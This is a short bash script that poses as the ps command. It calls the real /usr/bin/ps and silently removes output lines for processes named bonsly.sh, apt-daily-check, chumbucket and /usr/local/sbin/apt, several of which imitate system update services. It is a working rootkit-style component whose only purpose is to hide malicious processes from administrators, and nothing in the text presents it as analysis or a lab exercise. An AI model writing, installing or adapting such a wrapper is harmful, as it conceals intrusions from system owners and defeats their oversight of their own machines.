#!/bin/bash
REAL_PS="/usr/bin/ps"

# Capture ps output, preserve exit code, then filter
TMP_OUT=$("$REAL_PS" "$@" 2>&1)
PS_RC=$?

while IFS= read -r line; do
    if echo "$line" | grep -qE "(bonsly\.sh|apt-daily-check|chumbucket|/usr/local/sbin/apt)"; then
        : # drop it
    else
        echo "$line"
    fi
done <<< "$TMP_OUT"

exit $PS_RC
